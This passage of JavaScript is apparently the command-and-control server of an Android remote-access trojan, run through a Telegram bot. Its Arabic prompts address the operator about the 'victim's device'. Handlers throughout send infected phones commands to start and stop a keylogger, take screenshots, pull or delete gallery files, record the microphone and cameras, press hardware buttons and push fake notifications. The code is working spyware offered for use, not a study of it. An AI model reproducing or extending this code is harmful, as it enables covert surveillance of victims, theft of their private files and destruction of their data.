            '°• 𝙔𝙤𝙪𝙧 🔥 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ 🔥 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ\n🔥🔥\n🔥🔥',
            {reply_markup: {force_reply: false}, parse_mode: "HTML"})
        appBot.sendMessage(id,
            '  🔥  \n' +
            ' 🔥🔥 \n' +
            '🔥🔥🔥',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
        currentUuid = uuid
    }
    if (commend == 'torch_on') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('torch_on');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'torch_off') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('torch_off');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'keylogger_on') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('keylogger_on');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'keylogger_off') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('keylogger_off');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'screenshot') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('screenshot');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }

    if (commend == 'device_button') {
        currentUuid = uuid
        appBot.editMessageText(`°• 𝙋𝙧𝙚𝙨𝙨 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '|||', callback_data: `device_btn_:${currentUuid}:recent`},
                        {text: '■', callback_data: `device_btn_:${currentUuid}:home`},
                        {text: '<', callback_data: `device_btn_:${currentUuid}:back`}
                    ],
                                        [
                        {text: 'Vol +', callback_data: `device_btn_:${currentUuid}:vol_up`},
                        {text: 'Vol -', callback_data: `device_btn_:${currentUuid}:vol_down`},
                        {text: '⊙', callback_data: `device_btn_:${currentUuid}:power`}
                    ],
                    [
                        {text: 'Exit 🔙', callback_data: `device_btn_:${currentUuid}:exit`}
                    ]
                ]
            },
            parse_mode: "HTML"
        })
    }

    if (commend == 'device_btn_') {
        console.log(data.split(':')[0])
        console.log(data.split(':')[1])
        console.log(data.split(':')[2])

        switch (data.split(':')[2]) {
            case 'recent':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_recent');
                    }
                });
                break;
            case 'home':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_home');
                    }
                });
                break;
            case 'back':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_back');
                    }
                });
                break;
            case 'vol_up':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_vol_up');
                    }
                });
                break;
            case 'vol_down':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_vol_down');
                    }
                });
                break;
            case 'power':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_power');
                    }
                });
                break;
            case 'exit':
                appBot.deleteMessage(id, msg.message_id)
                break;
        } 
    }



    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'rec_camera_selfie') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•أدخل المدة التي تريد أن تسجل فيها الكاميرا صورة السيلفي\n\n' +
            '• لاحظ أنه يجب عليك إدخال الوقت 2 رقميًا بوحدات الثواني.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'rec_camera_main') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• على تظهر ان تريد التي الرسالة ادخل ...الضحية جهاز ؟\n\n' +
            '• الجهاز شاشة على تظهر قصيرة رسالة هي ثوان لبضع ؟',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• °• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
